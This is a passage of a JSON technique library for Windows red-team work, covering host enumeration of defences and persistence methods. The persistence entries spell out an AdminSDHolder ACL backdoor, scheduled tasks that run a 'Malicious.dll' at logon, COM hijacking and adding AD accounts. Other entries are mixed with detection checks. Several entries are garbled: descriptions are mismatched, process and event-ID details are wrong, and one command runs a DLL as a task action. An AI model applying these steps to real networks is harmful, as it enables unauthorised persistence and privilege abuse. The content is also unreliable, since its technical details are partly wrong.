processes\t|26190899-1602-49e8-8b27-eb1d0a1ce869|\n|Block persistence through WMI event subscription * File and folder exclusions not supported.\t|e6db77e5-3df2-4cf1-b95a-636979351e5b|\n|Block process creations originating from PSExec and WMI commands\t|d1e49aac-8f56-4280-b9ba-993a6d77406c|\n|Block rebooting machine in Safe Mode (preview)\t|33ddedf1-c6e0-47cb-833e-de6133960387|\n|Block untrusted and unsigned processes that run from USB\t|b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4|\n|Block use of copied or impersonated system tools (preview)\t|c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb|\n|Block Webshell creation for Servers\t|a8f5898e-1dc8-49a9-9878-85004b8a61e6|\n|Block Win32 API calls from Office macros\t|92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b|\n|Use advanced protection against ransomware\t|c1db55ab-c21a-4637-bb3f-a12568109d35|",
        "content": "",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerShell"
        ],
        "steps": [
            {
                "id": "980ae7c9-32c1-4ae1-8da7-0849423e6635",
                "name": "Query Registry",
                "description": "Check the Windows Registry for the status of Attack Surface Reduction (ASR) rules.",
                "commands": [
                    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard /v ASRRules",
                    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Policy Manager /v ASRRules"
                ],
                "requirements": {},
                "results": [
                    "PROTECTIONS:ASR"
                ]
            }
        ],
        "references": [
            "https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#asr-rule-to-guid-matrix",
            "https://learn.microsoft.com/en-us/defender-endpoint/enable-attack-surface-reduction#powershell",
            "https://learn.microsoft.com/en-us/microsoft-365-apps/security/trusted-locations"
        ]
    },
    {
        "id": "1e9b67c8-8037-4a10-8d33-f2a49d9d814a",
        "name": "AV-EDR",
        "phase": "03. Host Enumeration",
        "ttp": "M1049",
        "external": false,
        "description": "NoDescription",
        "content": "# AV-EDR\nQuery Processes and identify yourself or let CobaltStrike identify the AV processes via [Process Tree.cna](https://github.com/ars3n11/Aggressor-Scripts/blob/master/ProcessTree.cna)\n\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[wmic]]\nList Antivirus\n```cmd\nwmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe\n```"
        ],
        "tools": [
            "Seatbelt",
            "wmic"
        ],
        "steps": [
            {
                "id": "1c2d0f31-f7ab-4c1a-aa34-e76eab4bc4b4",
                "name": "Open Command Prompt with Admin Privileges",
                "description": "Access a command prompt with elevated privileges to perform administrative tasks.",
                "requirements": {},
                "results": [
                    "CMD:ADMIN"
                ]
            },
            {
                "id": "5e63f96a-e9f8-49c5-832d-770ce17e55fa",
                "name": "List Installed Antivirus Products",
                "description": "Use the WMIC command to list the installed antivirus products and their status.",
                "requirements": {
                    "command": "wmic"
                },
                "results": [
                    "AV:LIST",
                    "AV:DISPLAYNAME",
                    "AV:PRODUCTSTATE",
                    "AV:PATH"
                ]
            },
            {
                "id": "9e1bb75c-d821-44b0-b80d-9cecc3b22706",
                "name": "Review Antivirus Output",
                "description": "Examine the output from the WMIC command to identify installed antivirus products and their states.",
                "requirements": {},
                "results": [
                    "AV:ACTIVE",
                    "AV:INACTIVE"
                ]
            },
            {
                "id": "04d31539-88d8-415f-9fec-ab40ff4ed0be",
                "name": "Check Windows Event Logs for AV Events",
                "description": "Open Event Viewer and navigate to the Security Event Log to review events related to antivirus actions, particularly Event ID 5007.",
                "requirements": {},
                "results": [
                    "EVT:AV_ACTIVITY",
                    "EVT:5007"
                ]
            },
            {
                "id": "e80d64f5-026f-4479-831a-44dab7d3a1a4",
                "name": "Analyze Running Processes",
                "description": "Review the running processes to check for antivirus and EDR processes using the tasklist command.",
                "requirements": {
                    "command": "tasklist"
                },
                "results": [
                    "PROC:AV",
                    "PROC:EDR"
                ]
            },
            {
                "id": "7c048e72-1ea3-47df-a334-108702e30c67",
                "name": "Retrieve Antivirus Info Using PowerShell",
                "description": "Utilize PowerShell to obtain details about installed antivirus products using Get-CimInstance.",
                "requirements": {
                    "command": "Get-CimInstance"
                },
                "results": [
                    "AV:POWERSHELL_INFO"
                ]
            },
            {
                "id": "6a191b1f-800c-4b50-a100-1e77b9e9c3ef",
                "name": "Load CobaltStrike Process Tree Script",
                "description": "If using CobaltStrike, load the Process Tree Aggressor Script to automate the enumeration of processes.",
                "requirements": {},
                "results": [
                    "AV:PROCESSTREE"
                ]
            },
            {
                "id": "d86b94dc-5d59-4e9e-b40b-05f1b64ed1f1",
                "name": "Document Findings",
                "description": "Record the names and statuses of active antivirus products based on the gathered information.",
                "requirements": {},
                "results": [
                    "DOC:AV_REPORT"
                ]
            }
        ]
    },
    {
        "id": "cb9fc815-8531-4513-848c-c310a22e7caf",
        "name": "Credential Guard",
        "phase": "03. Host Enumeration",
        "ttp": "M1043",
        "external": false,
        "description": "This technique involves steps to determine the status of Windows Defender Credential Guard on a system and to locate related processes and configurations.",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "1bcf4bce-30b5-4a29-a368-537fcf17c4e0",
                "name": "Check if Windows Defender Credential Guard is enabled",
                "description": "Execute PowerShell command to check the status of Credential Guard by querying Win32_DeviceGuard for running security services.",
                "requirements": {},
                "results": [
                    "CREDGUARD:ENABLED",
                    "CREDGUARD:DISABLED"
                ]
            },
            {
                "id": "e1cde248-5e59-4b40-865e-4aa94522e474",
                "name": "Locate Lsalso.exe process",
                "description": "Use PowerShell to check if the Lsalso.exe process is running. This indicates that Credential Guard is active.",
                "requirements": {},
                "results": [
                    "LSALSO:RUNNING",
                    "LSALSO:NOT_RUNNING"
                ]
            },
            {
                "id": "817e3b52-5ce2-4613-96d8-5ffc18f6d99a",
                "name": "Verify Device Guard configuration in registry",
                "description": "Read the registry path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard to check the status of Credential Guard configurations.",
                "requirements": {},
                "results": [
                    "REGISTRY:CREDGUARD_CONFIG"
                ]
            },
            {
                "id": "007bb3da-35f2-4db5-a46c-93e43cc3d29b",
                "name": "Review Event Logs for Credential Guard activity",
                "description": "Examine the Microsoft-Windows-DeviceGuard Operational log in Windows Event Viewer for entries related to Credential Guard activity.",
                "requirements": {},
                "results": [
                    "EVENTLOG:CREDGUARD_ACTIVITY"
                ]
            }
        ]
    },
    {
        "id": "0f8b4c0f-e0b6-41a6-9935-8cbfe87ccfb9",
        "name": "Firewall",
        "phase": "03. Host Enumeration",
        "ttp": "M1037",
        "external": false,
        "description": "NoDescription",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "d5c3b486-d9a2-4bce-9c70-5af68ea18ed4",
                "name": "Check Windows Firewall Status",
                "description": "Determine if the Windows Firewall is enabled or disabled by querying the firewall settings in the Windows Security Center through the command `netsh advfirewall show allprofiles`.",
                "requirements": {},
                "results": [
                    "FIREWALL:ENABLED",
                    "FIREWALL:DISABLED"
                ]
            },
            {
                "id": "a8e6c9bd-dded-4f43-b405-8cf67fef8d39",
                "name": "List Firewall Rules",
                "description": "Retrieve and list all Windows Firewall rules using the command `netsh advfirewall firewall show rule name=all` to display all configured rules.",
                "requirements": {},
                "results": [
                    "RULES:ALLOW",
                    "RULES:BLOCK"
                ]
            },
            {
                "id": "03af5aba-a71b-41a4-a83d-d9c6720b2553",
                "name": "Check RDP Settings",
                "description": "Verify if Remote Desktop Protocol (RDP) is allowed through the firewall by executing `netsh advfirewall firewall show rule name=\"Remote Desktop\"` and checking the enabled status.",
                "requirements": {},
                "results": [
                    "RDP:ALLOWED",
                    "RDP:BLOCKED"
                ]
            },
            {
                "id": "f7c5e32c-57e3-4e54-92b1-91b77913b263",
                "name": "Check WinRM Configuration",
                "description": "Examine Windows Remote Management (WinRM) settings by running `winrm get winrm/config` and checking if the listener ports are allowed in the firewall.",
                "requirements": {},
                "results": [
                    "WINRM:ALLOWED",
                    "WINRM:BLOCKED"
                ]
            },
            {
                "id": "10fcd6a4-f0aa-4c4d-80a1-cb812f4d5b8d",
                "name": "Check PSExec Allowance",
                "description": "Check if PSExec is allowed to run over the network according to firewall settings by using the command `netsh advfirewall firewall show rule name=\"psexec\"` and checking the allowed status.",
                "requirements": {},
                "results": [
                    "PSEXEC:ALLOWED",
                    "PSEXEC:BLOCKED"
                ]
            }
        ]
    },
    {
        "id": "4b4ae673-f557-44b1-b4da-83d5a4cec299",
        "name": "LSA Protection",
        "phase": "03. Host Enumeration",
        "ttp": "M1025",
        "external": false,
        "description": "Identify weaknesses on the local system",
        "content": "> reg query reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[PowerShell]]\n`Get-WinEvent -FilterHashtable @{ LogName='system'; Id='12' ; ProviderName='Microsoft-Windows-Wininit' }`"
        ],
        "tools": [
            "PowerShell"
        ],
        "steps": [
            {
                "id": "c7e2d574-eb4a-4b4c-be67-e4a3c8cf8387",
                "name": "Check LSA RunAsPPL Configuration",
                "description": "Query the LSA registry to check if RunAsPPL is enabled or disabled by inspecting the registry key at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA with the value 'RunAsPPL'.",
                "requirements": {},
                "results": [
                    "LSA:RunAsPPL:ENABLED",
                    "LSA:RunAsPPL:DISABLED"
                ]
            },
            {
                "id": "073ed92c-7bcd-4bc4-9ec0-5cbd0822c960",
                "name": "Check for Event Log Entries",
                "description": "Retrieve system event log entries with ID '12' from the 'system' log to identify any recent changes to LSA protections, specifically installed by 'Microsoft-Windows-Wininit'.",
                "requirements": {},
                "results": [
                    "EVENT:LSA:CHANGE",
                    "EVENT:LSA:CHECK"
                ]
            }
        ]
    },
    {
        "id": "b94a13b1-649f-4a4c-87a1-ba2cdb3779b6",
        "name": "User Access Control (UAC)",
        "phase": "03. Host Enumeration",
        "ttp": "M1052",
        "external": false,
        "description": "Identify if UAC is enabled",
        "content": "## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[Seatbelt]]\nQuery the configuration applied to a machine\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe uac\n\n====== UAC ======\n\nConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries\nEnableLUA (Is UAC enabled?)    : 1\n``````"
        ],
        "tools": [
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "a1f1b5cc-fd57-44ea-9b86-6be67e19dfc1",
                "name": "Check UAC settings via Seatbelt",
                "description": "Execute the Seatbelt tool to check UAC settings. This tests for the status of UAC and its prompt behavior for non-Windows binaries.",
                "requirements": {
                    "tool": "Seatbelt",
                    "command": "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe uac"
                },
                "results": [
                    "UAC:ENABLED",
                    "UAC:DISABLED",
                    "UAC:PROMPT_BEHAVIOR"
                ]
            },
            {
                "id": "e111820e-3c01-411e-84d9-aebd409ae028",
                "name": "Check UAC status via Registry",
                "description": "Query the registry to check if UAC is enabled by inspecting the EnableLUA value set in HKEY_LOCAL_MACHINE. A value of 1 indicates UAC is enabled.",
                "requirements": {
                    "tool": "reg",
                    "command": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA"
                },
                "results": [
                    "UAC:ENABLED",
                    "UAC:DISABLED"
                ]
            },
            {
                "id": "3fe8d3f8-d1b8-44a2-88e5-a2e3c6e7540e",
                "name": "Check Event Log for UAC Changes",
                "description": "Review the security event log for events related to UAC changes by filtering for EventID 4672, which indicates changes in UAC permissions or settings.",
                "requirements": {
                    "tool": "wevtutil",
                    "command": "wevtutil qe Security /q:\"*[System[(EventID=4672)]]\" /f:text /c:10"
                },
                "results": [
                    "UAC:EVENT_LOG_PRESENT",
                    "UAC:NO_LOGS"
                ]
            }
        ]
    },
    {
        "id": "acb8cc72-86b1-472e-ba34-40bea0a505e0",
        "name": "Windows Update",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Identify which Windows Updates are installed",
        "content": "",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[wmic]]\nList Updates\n```cmd\nwmic qfe list brief\n```"
        ],
        "tools": [
            "wmic"
        ],
        "steps": [
            {
                "id": "4d497d22-860f-4c80-9073-758ec9c976bd",
                "name": "Check Installed Updates using WMIC",
                "description": "Use the Windows Management Instrumentation Command-line (WMIC) to list installed Windows updates.",
                "requirements": {},
                "results": [
                    "UPDATES:LIST"
                ]
            },
            {
                "id": "c65dfa19-3ed2-4bf6-8b77-615ebad9d28d",
                "name": "Review Windows Update Event Log",
                "description": "Inspect the Windows Event Log for events related to Windows Updates to gather information on updates that have been installed or failed. This includes checking the 'WindowsUpdateClient' source within the Event Viewer under Windows Logs > Application.",
                "requirements": {
                    "event_log": "Windows Update",
                    "event_source": "WindowsUpdateClient"
                },
                "results": [
                    "EVENTS:UPDATE_LOG"
                ]
            },
            {
                "id": "d6dfd2b4-0b91-46d0-8d29-fd77b8b4b690",
                "name": "Check Windows Update Service Status",
                "description": "Query the status of the Windows Update service by checking the service named 'wuauserv' using the command 'sc query wuauserv', and ensure it is running.",
                "requirements": {},
                "results": [
                    "SERVICE:RUNNING",
                    "SERVICE:STOPPED"
                ]
            },
            {
                "id": "a47e5741-641d-4016-b39b-49e2f08f4552",
                "name": "Export a List of Installed Updates to a File",
                "description": "Use WMIC to export the list of installed updates to a text file named 'UPDATES_LIST.txt' located in the current directory by invoking the command 'wmic qfe list brief > UPDATES_LIST.txt'.",
                "requirements": {},
                "results": [
                    "FILE:UPDATES_LIST.txt"
                ]
            }
        ]
    },
    {
        "id": "0c4fa102-f140-4e4c-bae0-c6b13b786234",
        "name": "Admin SDHolder Backdoor",
        "phase": "04. Persistence",
        "ttp": "T1098",
        "external": false,
        "description": "NoDescription",
        "content": "# Admin SDHolder Backdoor\nThe **AdminSDHolder** is a DACL template used to protect sensitive principals from modification. Within 60 minutes, you will find modified entries to be restored. Protected objects include Enterprise & Domain Admins, Schema Admins, Backup Operators and krbtgt.\n\nThe AdminSDHolder attribute itself is not protected so if we modify the DACL on it, those changes will be replicated again.\n\n[[PowerView#Assign rights AdminSDHolder]]\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "8de431f2-c13a-4ed6-8b7e-52cb4bb9aec2",
                "name": "Check current permissions on AdminSDHolder",
                "description": "Use PowerShell to retrieve the current permissions of the AdminSDHolder object by querying its DACL. This helps in understanding the current security configuration. Execute the command: `Get-Acl 'CN=AdminSDHolder,CN=System,DC=yourdomain,DC=com'`.",
                "requirements": {},
                "results": [
                    "DACL:CURRENT_PERMISSIONS"
                ]
            },
            {
                "id": "0c1190b7-253c-4aad-8230-ff9b410f11e9",
                "name": "Modify permissions on AdminSDHolder",
                "description": "Use PowerShell to modify the DACL of the AdminSDHolder object to include a backdoor user. This is done by using the `Set-Acl` command on the object with the appropriate modifications. Command example: `Set-Acl -Path 'CN=AdminSDHolder,CN=System,DC=yourdomain,DC=com' -AclObject $modifiedAcl` where `$modifiedAcl` is the updated access control list.",
                "requirements": {
                    "user": "Requires admin privileges"
                },
                "results": [
                    "DACL:MODIFIED"
                ]
            },
            {
                "id": "2e0b1d29-8dfb-4c05-bd39-f728be87c0d5",
                "name": "Confirm the changes to AdminSDHolder",
                "description": "Use PowerShell to verify that the modifications to the DACL have persisted by querying it again. The command used can be: `Get-Acl 'CN=AdminSDHolder,CN=System,DC=yourdomain,DC=com'` and comparing the results with previous permissions.",
                "requirements": {},
                "results": [
                    "DACL:CONFIRMED_MODIFICATIONS"
                ]
            },
            {
                "id": "c4ea1bc2-d2e5-466b-b8c5-fd6c815c7bd9",
                "name": "Monitor changes and replication events",
                "description": "Check the event logs for any changes or replication events related to AdminSDHolder by querying the relevant event IDs in the Security event log. Use the command: `Get-WinEvent -LogName Security | Where-Object { $_.Id -eq '4662' -or $_.Id -eq '5136' }` to filter for changes to DACLs and directory objects.",
                "requirements": {},
                "results": [
                    "EVENT:REPLICATION_CHANGE",
                    "EVENT:PERMISSION_CHANGE"
                ]
            }
        ]
    },
    {
        "id": "50c67e44-3137-416c-81d9-42c6eae97c7d",
        "name": "COM Hijacking",
        "phase": "04. Persistence",
        "ttp": "T1546.015",
        "external": false,
        "description": "Buying ages domains in order to bypass trust based connections",
        "content": "# Com Hijacking\n## Theory\nComponent Object Model (COM) is a technology that enables intercommunication between software components of different languages. COM offers a standard interfaces which allows information to flow between them if implemented.\n\nEach COM component is identified via a class ID (CLSID, a unique 128-bit GUID) and each component exposes functionality which can be identified via interface IDs (IIDs). A COM class (coclass) is an implementation of one or more interfaces, represented by their CLSID or a programmatic identifier (ProgID).\n\nIn Windows, COM classes and interfaces are defined in the registry under `HKEY__CLASSES__ROOT\\CLSID` and `HKEY__CLASSES__ROOT\\Interface` respectively. There exists also a RegFree COM which allows a COM component to exist without using the registry. In this case, data such as CLSID is stored in an XML manifest file.\n\n ![](/Images/regedit-com.png)\n\nAn in-process server allows the specified DLL (this DLL is the actual coclass implementation for this CLSID) to be loaded into the process space of the calling application - **InProcServer32** registers a 32bit in-process server.\nDifferent **ThreadingModel**s can be selected:\n* Apartment (Single-Threaded)\n* Free (Multi-Threaded)\n* Both (Single or Multi)\n* Neutral (Thread Neutral).\n\nYou may also find **LocalServer32**, which provides a path to an EXE rather than DLL.\n\n[OleView .NET](https://github.com/tyranid/oleviewdotnet) also allows us to find and inspect COM components.\n\n ![](/Images/oleview-com.png)\n\nCOM hijacking: Modify entries to point to an attacker controlled DLL.\nThe danger: You **will** break functionality.\n\nWhen an application attempts to locate an object, there is a search order that it goes through.\nMachine-wide: `HKEY__LOCAL__MACHINE\\Software\\Classes` \nPer-user: `HKEY__CURRENT__USER\\Software\\Classes`\nThese locations are then merged to form `HKEY__CLASSES__ROOT`.\n\nAny user can hijack or even register new COM objects within HKCU - these only apply to themselves but they do take precedence over those in HKLM.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerShell",
            "Process Hacker",
            "Process Monitor"
        ],
        "steps": [
            {
                "id": "a1f71e59-b8a8-4098-9f5c-3e5e819485bc",
                "name": "List all registered COM objects",
                "description": "Use PowerShell to list all registered COM objects and their InProcServer32 paths. This gives an overview of what COM objects are currently registered in the system.",
                "requirements": {},
                "results": [
                    "COM:LIST",
                    "COM:INPROCSERVER32"
                ]
            },
            {
                "id": "a2e92b45-4165-4b1e-b99f-e2e861ce2e6c",
                "name": "Inspect methods of a specific COM object",
                "description": "Use PowerShell to get methods of a specific COM object (e.g., WScript.Shell.1) to understand its functionality. This may reveal potential targets for abuse or manipulation in the context of COM.",
                "requirements": {},
                "results": [
                    "COM:METHODS"
                ]
            },
            {
                "id": "eb3a6ab0-fca6-4da3-8233-e8eb791d1c27",
                "name": "Monitor registry access patterns for COM hijacking",
                "description": "Run Process Monitor to capture events related to registry access, specifically looking for InProcServer32 paths in HKLM and HKCU. This helps in identifying unauthorized changes.",
                "requirements": {},
                "results": [
                    "REG:ACCESS",
                    "REG:NAME NOT FOUND"
                ]
            },
            {
                "id": "5c62825c-bb49-4515-99ed-e97845bb4e0b",
                "name": "Verify InProcServer32 entries in registry",
                "description": "Check if a specific CLSID's InProcServer32 entry exists in HKLM but not in HKCU, using PowerShell. This can help verify if a legitimate COM object has been hijacked or if the hijacker is attempting to mask their entry.",
                "requirements": {},
                "results": [
                    "REG:EXISTS",
                    "REG:NOT FOUND"
                ]
            },
            {
                "id": "3b534e23-4980-4fcd-93ed-3fa99431d36d",
                "name": "Check for COM object under HKCU",
                "description": "Verify if a malicious COM object has been registered under HKCU that points to an attacker-controlled DLL. This helps in identifying potential vulnerabilities in user-specific contexts of COM objects.",
                "requirements": {},
                "results": [
                    "CRED:HKCU",
                    "CRED:ATTACKER_DLL"
                ]
            }
        ]
    },
    {
        "id": "4b735b18-7544-4d25-af21-a7aa341177ae",
        "name": "Create Account",
        "phase": "04. Persistence",
        "ttp": "T1136",
        "external": false,
        "description": "Adding a user to the AD for persistence",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ldapmodify"
        ],
        "steps": [
            {
                "id": "d62e90dd-943c-4b49-b37d-fb429b8c3f03",
                "name": "Create LDIF File for User",
                "description": "Create an LDIF file containing the new user's information with attributes including uid, homeDirectory, and groups.",
                "requirements": {},
                "results": [
                    "FILE:USER_LDIF_CREATED"
                ]
            },
            {
                "id": "c59ab744-1a39-4a97-a64e-707de3ba23b9",
                "name": "Execute ldapmodify Command",
                "description": "Run the ldapmodify command to add the user to the Active Directory using the previously created LDIF file located at './user.ldif.txt'.",
                "requirements": {
                    "ldif_file": "user.ldif.txt",
                    "ldap_host": "127.0.0.1",
                    "ldap_user_dn": "cn=Manager,dc=maxcrc,dc=com",
                    "ldap_password": "your_password_here"
                },
                "results": [
                    "LDAP:USER_ADDED_SUCCESSFULLY",
                    "LDAP:ERROR_IF_EXISTS"
                ]
            },
            {
                "id": "a5b67831-8980-4d04-a36b-8d8c8c7de6fb",
                "name": "Verify User Creation",
                "description": "Check if the user has been created successfully in Active Directory by performing a search for the user 'jdoe'.",
                "requirements": {
                    "ldap_host": "127.0.0.1",
                    "ldap_user_dn": "cn=Manager,dc=maxcrc,dc=com",
                    "ldap_password": "your_password_here",
                    "username": "jdoe"
                },
                "results": [
                    "LDAP:USER_EXISTS",
                    "LDAP:USER_NOT_FOUND"
                ]
            }
        ]
    },
    {
        "id": "9033ee38-f8f5-4aa7-9692-33542df7e312",
        "name": "DLL Sideloading",
        "phase": "04. Persistence",
        "ttp": "T1574.002",
        "external": false,
        "description": "Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.",
        "content": "# DLL Sideloading\nSide-loading uses the DLL search order by positioning both the victim application and malicious payload next to each other. Adversaries often use side-loading as a means of hiding their tracks through legitimate, trusted processes avoiding detection. In order to further evade detection payloads may additionally be encrypted/packed until the in memory execution.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Process Hacker]]\n[[COM Hijacking]]"
        ],
        "tools": [
            "Process Hacker"
        ],
        "steps": [
            {
                "id": "0cfdcd6d-4d7e-4c89-93b3-e46e11d4b4de",
                "name": "Assess DLL Search Order",
                "description": "Identify the order in which DLLs are loaded by a specific application using process analysis tools to help determine if a malicious DLL can be side-loaded. Check paths like 'C:\\Windows\\System32' and 'C:\\Program Files\\TargetApp\\'.",
                "requirements": {},
                "results": [
                    "DLL:FOUND",
                    "DLL:SEARCH_ORDER"
                ]
            },
            {
                "id": "4c7c857d-8bb1-4835-9b7d-1ff5a0aa465b",
                "name": "Monitor DLL Load Events",
                "description": "Check the Windows Event Log for DLL load events specifically looking for entries in 'Application' logs and filtering by event IDs related to DLL loading (e.g., 3000-3003).",
                "requirements": {},
                "results": [
                    "EVENT:DLL_LOAD",
                    "EVENT:UNEXPECTED_DLL"
                ]
            },
            {
                "id": "958c63c0-2427-49c3-804c-7e55a29122a0",
                "name": "Identify Co-located DLLs with Executables",
                "description": "List all files in the same directory as a suspected target executable, which is typically located in 'C:\\Program Files\\TargetApp\\'. Check for any DLLs that accompany the executable.",
                "requirements": {},
                "results": [
                    "DLL:COLOCATED",
                    "EXECUTABLE:TARGET"
                ]
            },
            {
                "id": "9ccf204e-3735-40ca-b78a-4e80bdf3ae59",
                "name": "Inspect Process Memory",
                "description": "Use memory analysis tools such as Process Hacker to inspect the memory of a running process (e.g., 'C:\\Program Files\\TargetApp\\target.exe') for any injected or side-loaded DLLs.",
                "requirements": {},
                "results": [
                    "MEMORY:DLL_INJECTED",
                    "PROCESS:TARGET"
                ]
            },
            {
                "id": "e065c622-64be-444e-9c3d-6607db04d564",
                "name": "Check Windows Defender Logs",
                "description": "Review logs from Windows Defender or other security solutions for alerts related to DLLs or other executable files showing suspicious behavior, located under 'Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> Windows Defender'.",
                "requirements": {},
                "results": [
                    "ALERT:DLL_SIDEDLOAD",
                    "LOG:DEFENDER"
                ]
            }
        ]
    },
    {
        "id": "1109bfa4-fc36-41f3-a877-53cbd649b276",
        "name": "Runkey",
        "phase": "04. Persistence",
        "ttp": "T1547.001",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# RunKey\nAutoRun values in HKCU and HKLM allow applications to start on boot. They are often used by software updaters, download or driver utilities.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "c0abe02a-dfa8-41a2-9ae5-7bdbee2b37e3",
                "name": "Check AutoRun keys in HKCU",
                "description": "Examine the AutoRun registry keys located at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and RunOnce to identify any persistence mechanisms.",
                "requirements": {},
                "results": [
                    "PERSIST:HKCU:Run",
                    "PERSIST:HKCU:RunOnce"
                ]
            },
            {
                "id": "679ef0d7-22ba-4c74-956b-7b0b4dc38068",
                "name": "Check AutoRun keys in HKLM",
                "description": "Examine the AutoRun registry keys located at HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and RunOnce to identify any persistence mechanisms.",
                "requirements": {},
                "results": [
                    "PERSIST:HKLM:Run",
                    "PERSIST:HKLM:RunOnce"
                ]
            },
            {
                "id": "a7bca9be-5c71-4fa1-b5a7-9493c05c8e82",
                "name": "Inspect event logs for application launches",
                "description": "Review the Windows Event Logs at 'Event Viewer > Windows Logs > Application' for logs related to unexpected or unauthorized startup applications.",
                "requirements": {},
                "results": [
                    "EVENT:APP:START",
                    "EVENT:APP:ERROR"
                ]
            },
            {
                "id": "a19f5004-9c7d-4f2a-bbd2-bc80a23d5798",
                "name": "Audit scheduled tasks",
                "description": "Check the Task Scheduler for any entries that may launch malicious applications or scripts that could persist, typically located in 'Task Scheduler > Task Scheduler Library'.",
                "requirements": {},
                "results": [
                    "PERSIST:SCHEDULED_TASK"
                ]
            },
            {
                "id": "d47fd742-401b-4e85-94a3-10d1c1e3d425",
                "name": "Monitor file system for changes related to Teams",
                "description": "Use file monitoring tools to detect changes in the directory 'C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\Teams' that may indicate DLL hijacking attempts.",
                "requirements": {},
                "results": [
                    "FILE:CHANGE:TEAMS"
                ]
            }
        ]
    },
    {
        "id": "d8184aa4-cedf-4667-accc-575e2c468eba",
        "name": "Scheduled Tasks",
        "phase": "04. Persistence",
        "ttp": "T1053",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# Scheduled Task\nThe Windows Task Scheduler allows the creation of tasks which are associated with a trigger. The different triggers are:\n* time of day\n* user-logon\n* idle state\n* locked state\n* direct execution\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc",
            "SharPersist"
        ],
        "steps": [
            {
                "id": "d15c5e07-a6a4-46b8-9f4d-ebd8299cb449",
                "name": "List existing scheduled tasks",
                "description": "Use PowerShell to enumerate all scheduled tasks on the system by running 'Get-ScheduledTask'. This retrieves a list of all scheduled tasks along with their properties and status.",
                "requirements": {},
                "results": [
                    "TASK:LIST"
                ]
            },
            {
                "id": "ac9be836-36b7-4bba-b9c6-95cb3bc6370b",
                "name": "Identify task with execution context",
                "description": "Check for tasks that run with user credentials or specific privileges using 'Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne $null}'. This identifies tasks set to run under a user context, which may be exploited.",
                "requirements": {},
                "results": [
                    "TASK:ID_USER_EXECUTION"
                ]
            },
            {
                "id": "afcf513c-23ba-44cc-9e51-99db197f3bdb",
                "name": "Create a new scheduled task",
                "description": "Create a scheduled task that executes a malicious DLL under Teams' process using PowerShell with a command like 'New-ScheduledTask -Action (New-ScheduledTaskAction -Execute \"C:\\Path\\To\\Malicious.dll\") -Trigger (New-ScheduledTaskTrigger -AtLogOn) | Register-ScheduledTask -TaskName \"MaliciousTask\"'. This sets up persistence.",
                "requirements": {},
                "results": [
                    "TASK:CREATED"
                ]
            },
            {
                "id": "a23847d0-d5fd-4950-b480-c5601fb3448f",
                "name": "Modify an existing scheduled task",
                "description": "Modify an existing task to execute a payload or a malicious DLL using 'Set-ScheduledTask' to change the action of the task. The command format is 'Set-ScheduledTask -TaskName \"TargetTask\" -Action (New-ScheduledTaskAction -Execute \"C:\\Path\\To\\Malicious.dll\")'. This alters the original task to a harmful action.",
                "requirements": {},
                "results": [
                    "TASK:MODIFIED"
                ]
            },
            {
                "id": "de9afd0a-4e1e-46f2-aa4e-8a657aaae688",
                "name": "Check task execution history",
                "description": "Review the event logs related to scheduled task executions to see if the task has run. Use the event viewer to check logs under 'Applications and Services Logs > Microsoft > Windows > TaskScheduler > Operational' for event ID 106, indicating task execution.",
                "requirements": {},
                "results": [
                    "TASK:EXECUTION_HISTORY"
                ]
            },
            {
                "id": "6c6bd1c1-ef44-4d71-b49b-f88fc8558956",
                "name": "Search for suspicious task names",
                "description": "Use PowerShell to search for potentially suspicious task names by running 'Get-ScheduledTask | Where-Object {$_.TaskName -match \"(malicious|suspicious|test)\"}'. This identifies tasks with names that may indicate malicious activity.",
                "requirements": {},
                "results": [
                    "TASK:SUSPICIOUS_NAMES"
                ]
            }
        ]
    },
    {
